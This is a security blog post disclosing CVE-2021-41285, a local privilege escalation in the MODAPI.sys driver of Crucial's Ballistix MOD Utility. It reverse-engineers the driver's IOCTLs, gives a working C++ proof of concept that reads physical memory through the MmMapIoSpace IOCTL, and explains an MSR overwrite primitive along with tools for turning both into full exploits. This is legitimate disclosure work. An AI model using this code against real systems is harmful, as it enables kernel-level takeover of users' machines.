* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from voidsec.com_9f502b7b_20250115_211548.html ===


[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo.png)![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
  + [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/)
* [About](https://voidsec.com/member/voidsec/)
* [Contact](https://voidsec.com/contact-me/)

 [Back to Posts](https://voidsec.com)
![](https://voidsec.com/wp-content/uploads/2021/09/MOD-Utility-Snapshot.png)

### Share this post

[Facebook](https://www.facebook.com/sharer.php?u=https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/ "Facebook")
[Twitter](https://twitter.com/intent/tweet?text=Crucial%E2%80%99s+MOD+Utility+LPE+%26%238211%3B+CVE-2021-41285&url=https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/ "X")
[LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/&title=Crucial%E2%80%99s+MOD+Utility+LPE+%26%238211%3B+CVE-2021-41285 "LinkedIn")
[Email](/cdn-cgi/l/email-protection#142b6761767e71776029576661777d7578315126312c24312d2d673f595b503f41607d787d606d3f5844513f3126223126272c2625253127563f5742513926242625392025262c21327579642f767b706d297c606064672e3b3b627b7d706771773a777b793b776661777d757839797b703961607d787d606d39786471397762713926242625392025262c213b "Email")
[VK](https://vk.com/share.php?url=https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/&title=Crucial%E2%80%99s+MOD+Utility+LPE+%26%238211%3B+CVE-2021-41285&image=https://voidsec.com/wp-content/uploads/2021/09/MOD-Utility-Snapshot.png&noparse=true "VK")
[Reddit](http://www.reddit.com/submit?url=https://voidsec.com/crucial-mod-utility-lpe-cve-2021-41285/&title=Crucial%E2%80%99s+MOD+Utility+LPE+%26%238211%3B+CVE-2021-41285 "Reddit")
WhatsApp

## Crucial’s MOD Utility LPE – CVE-2021-41285

Posted by: voidsec

Post Date: September 29, 2021

---

[voidsec](https://voidsec.com/author/voidsec/ "Posts by voidsec")2022-01-14T08:58:16+01:00
**Reading Time:**   11 minutes

[Crucial Ballistix MOD Utility](https://www.crucial.com/products/gaming-memory/ballistix-downloads) is a software product that can be used to customize and control gaming systems, specifically LED colours and patterns, memory, temperature, and overclock.

During my vulnerability research, I’ve discovered that this software utilizes a driver, `MODAPI.sys`, containing **multiple vulnerabilities** and allowing an attacker to achieve **local privilege escalation** from a low privileged user to `NT AUTHORITY\SYSTEM`.

> This blog post is a re-post of the original article “Crucial’s MOD Utility LPE” that I have written for Yarix on [YLabs](https://labs.yarix.com/).

Table of Contents

* [Advisory – CVE-2021-41285](#advisory-%e2%80%93-cve-2021-41285 "Advisory – CVE-2021-41285")
* [Technical Details](#technical-details "Technical Details")
* [Reverse Engineering](#reverse-engineering "Reverse Engineering")
  + [DispatchDeviceControl](#dispatchdevicecontrol "DispatchDeviceControl")
    - [Get/Set BusDataByOffset](#getset-busdatabyoffset "Get/Set BusDataByOffset")
    - [Read/Write 1/2/4 bytes](#readwrite-124-bytes "Read/Write 1/2/4 bytes")
    - [MmMapIoSpace](#mmmapiospace "MmMapIoSpace")
    - [Read/Write MSRs](#readwrite-msrs "Read/Write MSRs")
    - [Read PMC](#read-pmc "Read PMC")
    - [Halt](#halt "Halt")
* [Exploitation](#exploitation "Exploitation")
  + [Get/Set BusDataByOffset](#getset-busdatabyoffset-2 "Get/Set BusDataByOffset")
  + [Read/Write 1/2/4 bytes](#readwrite-124-bytes-2 "Read/Write 1/2/4 bytes")
  + [MapPhysicalMemory – Write-What-Where Primitive](#mapphysicalmemory-%e2%80%93-write-what-where-primitive "MapPhysicalMemory – Write-What-Where Primitive")
  + [Write MSRs – Pointer Overwrite Primitive](#write-msrs-%e2%80%93-pointer-overwrite-primitive "Write MSRs – Pointer Overwrite Primitive")
* [Disclosure Timeline](#disclosure-timeline "Disclosure Timeline")
* [Resources & References](#resources-references "Resources & References")
## Advisory – CVE-2021-41285

Crucial by Micron Technology, Inc **Ballistix MOD Utility** v.<= 2.0.2.5 is vulnerable to **multiple Privilege Escalation** (LPE/EoP) vulnerabilities in the `MODAPI.sys` driver component.

All the vulnerabilities are triggered by sending specific IOCTL requests and will allow to:

* Directly interact with physical memory via the `MmMapIoSpace` function call, mapping physical memory into a virtual address user-space.
* Read/write Model-Specific Registers (MSRs) via the `__readmsr/__writemsr` functions calls.
* Read/write 1/2/4 bytes to or from an IO port.

Attackers could exploit these issues to achieve local privilege escalation from low-privileged users to `NT AUTHORITY\SYSTEM`.

## Technical Details

As always the driver file, IDA’s DB and exploit code, are available on my [GitHub repo](https://github.com/VoidSec/Exploit-Development/tree/master/windows/x64/kernel/crucial_Ballistix_MOD_Utility_v.2.0.2.5).

* `MODAPI.sys - D25340AE8E92A6D29F599FEF426A2BC1B5217299`

MODAPI.sys is a driver developed by Crucial as part of Ballistix MOD utility; unfortunately, it is the exact copy of a problematic open-source project, and it also inherits its vulnerabilities:

* `WinRing0x64.sys - D25340AE8E92A6D29F599FEF426A2BC1B5217299` developed by [OpenLibSys](https://github.com/QCute/WinRing0/releases).

Not only do the hashes perfectly match but “bindiffing” disassembled versions of both drivers clearly prove my point; as can be seen below, `MODAPI.sys` is indistinguishable from the `WinRing0x64.sys` driver:

![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x24.jpg)

## Reverse Engineering

Without cheating and reading the open-source code of `WinRing0x64.sys`, reverse engineering the `MODAPI.sys` driver is quite simple as it doesn’t have many functionalities:

* `DriverEntry - sub_15008`
* `RealDriverEntry – sub_11008`
* `DispatchDeviceControl – sub_110D8`
* `Readmsr – sub_11468`
* `Readpmc - sub_114D0`
* `UnloadDriver – sub_11424`
* `Writemsr – sub_1149C`
* `MapPhysicalMemory – sub_11504`

For the sake of this blog post, we’ll focus on the `DispatchDeviceControl` routine and later, in the exploitation phase, on the `MapPhysicalMemory` function.

### DispatchDeviceControl

This routine appears as the most complex of the entire binary, as we can see from the below image:

![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x72.jpg)Even if, in reality, it’s quite simple as it acts as a “switch case” for the different IOCTL codes implemented in the driver.

#### Get/Set BusDataByOffset

> “These functions retrieve/set information, starting at the offset, about a slot or address on an I/O bus.” – [**MSDN**](https://docs.microsoft.com/en-us/previous-versions/windows/embedded/ms899357%28v%3Dmsdn.10%29)

* `0x9C406144: HalGetBusDataByOffset`
* `0x9C40A148: HalSetBusDataByOffset`

#### Read/Write 1/2/4 bytes

> “Generates the out instruction, which sends 1 byte specified by Data out the I/O port specified by Port.” – [**MSDN**](https://docs.microsoft.com/en-us/cpp/intrinsics/outbyte?view=msvc-160)

* `0x9C40A0C8, 0x9C40A0D8 __outbyte, 0x9C40A0DC __outword, 0x9C40A0E0 __outdword`
* `0x9C4060C4, 0x9C4060CC __inbyte, 0x9C4060D0 __inword, 0x9C4060D4 __indword`

#### MmMapIoSpace

> “The **MmMapIoSpace** routine maps the given physical address range to nonpaged system space.” – [**MSDN**](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-mmmapiospace)

* `0x9C406104: MmMapIoSpace`

#### Read/Write MSRs

> “Generates the Write to Model Specific Register (wrmsr) instruction which writes the contents of registers EDX:EAX into the 64-bit model-specific register (MSR) specified in the ECX register.” – [**Felix Cloutier**](https://www.felixcloutier.com/x86/wrmsr)

* `0x9C402084: __readmsr`
* `0x9C402088: __writemsr`

#### Read PMC

> “Generates the rdpmc instruction, which reads the performance monitoring counter specified by *counter*.” – [**MSDN**](https://docs.microsoft.com/en-us/cpp/intrinsics/readpmc?view=msvc-160)

* `0x9C40208C: __readpmc`

#### Halt

> “Halts the microprocessor until an enabled interrupt, a non-maskable interrupt (NMI), or a reset occurs.” – [**MSDN**](https://docs.microsoft.com/en-us/cpp/intrinsics/halt?view=msvc-160)

* `0x9C402090: __halt`

Pretty much any of these privileged operations, if exposed to unprivileged users, directly translate to different vulnerabilities.

## Exploitation

### Get/Set BusDataByOffset

Allows a low privilege user to **write data to the I/O bus**, possibly changing PCI configuration information, or vendor-specific data registers.

### Read/Write 1/2/4 bytes

Allows a low privilege user to **read/write 1/2/4 bytes to or from an IO port**. Since I/O privilege level (IOPL) equals to current privilege level (CPL), it is possible to interact with peripheral devices such as the HDD and GPU to either read/write directly to the disk or invoke Direct Memory Access (DMA) operations. For example, communicating with ATA port IO for directly writing to the disk, then overwriting a binary that is loaded by a privileged process.

### MapPhysicalMemory – Write-What-Where Primitive

Since we can control all the parameters of the `MmMapIoSpace` function, we will possibly be able to specify a physical memory address and offset and copy a user-controlled buffer into that space once it is mapped into our process space. This is essentially a **Write-What-Where exploit primitive**.

In the below PoC, I’m directly interacting with the RAM, mapping a physical memory address to a newly allocated buffer in userspace in order to **disclose its content**. Using [VDM](https://githacks.org/_xeroxz/vdm/-/releases) the PoC below can be quickly weaponized into a full-fledged exploit.

![](https://voidsec.com/wp-content/uploads/porto_placeholders/100x36.jpg)

Memory Dump PoC.cpp
```
/*
Exploit title:      Ballistix MOD Utility v.<= 2.0.2.5 (MODAPI.sys) - Mapping physical memory into virtual address space
Exploit Authors:    Paolo Stagno aka VoidSec - [[email protected]](/cdn-cgi/l/email-protection) - https://voidsec.com
Grade:              PoC
CVE:                CVE-2021-41285
Date:               15/09/2021
Version:            v.2.0.2.5
Tested on:          Windows 10 Pro x64 v.1903 Build 18362.30
Category:           local exploit
Platform:           windows
*/

#include <iostream>
#include <iomanip>
#include <windows.h>

using namespace std;

int main()
{
  DWORD PhysicalMemAddr = 0xE0000; // Physical memory address to read from, change accordingly (max 0x8FFFFFFF)
  DWORD dwDataSizeToRead = 0x4; // Size of data to read (in chunks), in bytes (1, 2, 4); 1 = movsb (BYTE), 2 = movsw (WORD), 4 = movsd (DWORD)
  DWORD dwAmountOfDataToRead = 8; // Amount of data (in chunks) to read
  DWORD dwBytesReturned = 0; // number of bytes returned from the DeviceIoControl request
  DWORD dwIOCTL = 0x9C406104; // IOCTL reaching MmMapIoSpace function call

  // open a handle to the device exposed by the driver - symlink is \\.\\WinRing0_1_2_0
  HANDLE hDevice = ::CreateFileW(
    L"\\\\.\\WinRing0_1_2_0",
    GENERIC_READ | GENERIC_WRITE,
    NULL,
    nullptr,
    OPEN_EXISTING,
    NULL,
    NULL);

  if (hDevice == INVALID_HANDLE_VALUE)
  {
    cout << "[!] Couldn't open handle to MODAPI.sys driver. Error code: " << ::GetLastError() << endl;
    return -1;
  }
  cout << "[+] Opened a handle to MODAPI.sys driver!" << endl;

  cout << "[-] Allocating buffers' memory area!" << endl;
  // allocate memory for the DeviceIoControl lpInBuffer & lpOutBuffer buffers
  LPVOID lpInBuffer = VirtualAlloc((LPVOID)0x41000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  LPVOID lpOutBuffer = VirtualAlloc((LPVOID)0x42000000, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (lpInBuffer == NULL || lpOutBuffer == NULL)
  {
    cout << "[!] Unable to allocate buffers' memory area. Error code: " << ::GetLastError() << endl;
    return -1;
  }

  cout << "[-] Populating lpInBuffer" << endl;
  memmove(lpInBuffer, &PhysicalMemAddr, sizeof(DWORD));
  memmove((BYTE*)lpInBuffer + 0x8, &dwDataSizeToRead, sizeof(DWORD));
  memmove((BYTE*)lpInBuffer + 0xC, &dwAmountOfDataToRead, sizeof(DWORD));

  cout << "[-] Sending IOCTL 0x" << hex << uppercase << setw(8) << setfill('0') << dwIOCTL << endl;
  bool success = DeviceIoControl(
    hDevice,
    dwIOCTL,
    lpInBuffer, // expressed in Bytes; MUST be 0x10
    0x10,
    lpOutBuffer, // MUST be GREATER than chunk size (dwDataSizeToRead * dwAmountOfDataToRead)
    0x40,
    &dwBytesReturned,
    nullptr);
  if (!success)
  {
    cout << "[!] Couldn't send IOCTL 0x" << hex << uppercase << setw(8) << setfill('0') << dwIOCTL
      << " Error code: " << ::GetLastError() << endl;
    return -1;
  }

  cout << endl << "[+] Dumping " << dec << (dwDataSizeToRead * dwAmountOfDataToRead)
    << " bytes of data from 0x" << hex << uppercase << setw(16) << setfill('0') << PhysicalMemAddr << endl;
  cout << string(70, '-') << endl;
  // pretty print memory dump
  for (int nSize = 0; nSize <= 0x32; nSize += 0x10)
  {
    for (int i = 0; i <= 0xF; i++)
    {
      // output byte
      printf("%02X ", *((BYTE*)lpOutBuffer + i + nSize));
    }
    cout << "  ";
    for (int i = 0; i <= 0xF; i++)
    {
      CHAR cChar = *((BYTE*)lpOutBuffer + i + nSize);
      // if byte is in printable range, then print it's ASCII representation
      if (cChar >= 0x20 && cChar <= 0x7E)
      {
        printf("%c", *((BYTE*)lpOutBuffer + i + nSize));
      }
      else
      {
        cout << ".";
      }
    }
    cout << endl;
  }
  cout << string(70, '-') << endl;
  // housekeeping
  VirtualFree((LPVOID)0x41000000, 0, MEM_RELEASE);
  VirtualFree((LPVOID)0x42000000, 0, MEM_RELEASE);
  ExitProcess(0);
}

```
### Write MSRs – Pointer Overwrite Primitive

Model-Specific Registers (MSRs) are registers used for toggling or querying CPU info. The most interesting thing about MSRs is that on modern systems the `MSR _LSTAR` register is used during a system call transition from user-mode to kernel-mode.

The transition to kernel-mode can be schematized as follows:

1. syscall
2. read `MSR _LSTAR` register
3. call `MSR _LSTAR` pointer (Ring-0)
4. kernel function handles the syscall logic

Exposed WRMSR (`__writemsr`) instruction gives us a **pointer overwrite primitive**, the function pointer is called when any syscall is issued and it is called from **ring-0**. Using [msrexec](https://githacks.org/_xeroxz/msrexec) we can quickly weaponize it into a full-fledged exploit.

## Disclosure Timeline

* 15/09/2021 – Issues are discovered, and a CVE number is requested
* 15/09/2021 – MITRE assign CVE-2021-41285
* 16/09/2021 – Issues are reported to Micron ([[email protected]](/cdn-cgi/l/email-protection))
* 30/09/2021 – Micron never replied nor acknowledged the vulnerabilities: Full Disclosure

## Resources & References

* [VDM](https://web.archive.org/web/20210811022839/https%3A/back.engineering/01/11/2020/) & [msrexec](https://githacks.org/_xeroxz/msrexec)
* [MSR Madness Infiltrate 2019](https://vimeo.com/335216903)
* [Sentinel One HP OMEN LPE](https://www.sentinelone.com/labs/cve-2021-3437-hp-omen-gaming-hub-privilege-escalation-bug-hits-millions-of-gaming-devices/)
* [CVE-2020-12928 – AMDRyzenMasterDriver.sys](https://movaxbx.ru/2020/10/14/cve-2020-12928-exploit-proof-of-concept-privilege-escalation-in-amd-ryzen-master-amdryzenmasterdriver-sys/)
* [LG driver LPE](http://www.jackson-t.ca/lg-driver-lpe.html)
* [MSI ntiolib.sys LPE](http://blog.rewolf.pl/blog/?p=1630)
* [Dell SupportAssist Driver LPE](http://dronesec.pw/blog/2018/05/17/dell-supportassist-local-privilege-escalation/)

 [Back to Posts](https://voidsec.com)

---

### Recent Posts

* [OffSec EXP-401 Advanced Windows Exploitation (AWE) – Course Review](https://voidsec.com/offsec-exp-401-advanced-windows-exploitation-awe-course-review/)
* [Reverse Engineering Terminator aka Zemana AntiMalware/AntiLogger Driver](https://voidsec.com/reverse-engineering-terminator-aka-zemana-antimalware-antilogger-driver/)
* [SANS SEC760: Advanced Exploit Development for Penetration Testers – Review](https://voidsec.com/sans-sec760-advanced-exploit-development-for-penetration-testers-review/)
* [Naughty List Challenge Write-Up – X-MAS CTF](https://voidsec.com/naughty-list-challenge-write-up-x-mas-ctf/)
* [Windows Exploitation Challenge – Blue Frost Security 2022 (Ekoparty)](https://voidsec.com/windows-exploitation-challenge-blue-frost-security-2022/)
### Categories

* [Blog](https://voidsec.com/category/blog/) (117)
  + [Advisories](https://voidsec.com/category/blog/advisories/) (22)
  + [Conference Reportage](https://voidsec.com/category/blog/conference-reportage/) (11)
  + [Cybercrime](https://voidsec.com/category/blog/cybercrime/) (8)
  + [Drones/IOT](https://voidsec.com/category/blog/drones-iot/) (4)
  + [Fuzzing](https://voidsec.com/category/blog/fuzzing/) (3)
  + [News](https://voidsec.com/category/blog/news/) (17)
    - [ECG](https://voidsec.com/category/blog/news/ecg/) (2)
  + [Penetration Test/Red Team](https://voidsec.com/category/blog/penetration-test-red-team/) (14)
  + [Reverse Engineering/Malware Analysis](https://voidsec.com/category/blog/reverse-engineering-malware-analysis/) (21)
  + [Shellcoding/SLAE x86](https://voidsec.com/category/blog/shellcoding-slae/) (7)
  + [Tools](https://voidsec.com/category/blog/tools/) (1)
  + [Uncategorized](https://voidsec.com/category/blog/uncategorized/) (21)
  + [Vulnerability Research/Exploit Development](https://voidsec.com/category/blog/vulnerability-research-exploit-development/) (18)
    - [Heap-based Exploitation](https://voidsec.com/category/blog/vulnerability-research-exploit-development/heap-based-exploitation/) (2)
    - [Stack-based Exploitation](https://voidsec.com/category/blog/vulnerability-research-exploit-development/stack-based-exploitation/) (4)
    - [Windows Kernel](https://voidsec.com/category/blog/vulnerability-research-exploit-development/windows-kernel/) (10)
    - [Windows Userland](https://voidsec.com/category/blog/vulnerability-research-exploit-development/windows-userland/) (6)
  + [Web/Application Security](https://voidsec.com/category/blog/web-application-security/) (23)

* [Blog](https://voidsec.com/category/blog/)
* [Advisories](https://voidsec.com/advisories/)
* [Vulnerability Disclosure Policy](https://voidsec.com/disclosure-policy/%20)

* [About](https://voidsec.com/member/voidsec/)
* [Contact Me](https://voidsec.com/contact-me/)
* [Mastodon](https://infosec.exchange/%40voidsec)

### Follow Me

[Twitter](https://twitter.com/Void_Sec "X")
[RSS](http://rss.voidsec.com/ "RSS")
[Youtube](https://www.youtube.com/user/VoidSecTeam "Youtube")
[Linkedin](https://www.linkedin.com/in/paolostagno "Linkedin")
[Reddit](https://www.reddit.com/user/Void_Sec/ "Reddit")
[Telegram](https://t.me/voidsec_updates "Telegram")

[![VoidSec](//voidsec.com/wp-content/uploads/2018/02/Voidsec_logo_white-1.png)](https://voidsec.com/ "VoidSec - Some things in life are unpredictable, your Cyber Security doesn’t have to be one of them")

Copyright © Paolo Stagno 2012-2024, All Rights Reserved.

This website uses cookies in order to improve your experience. By using this website, you agree to our use of cookies and other technologies to process your data.I Agree


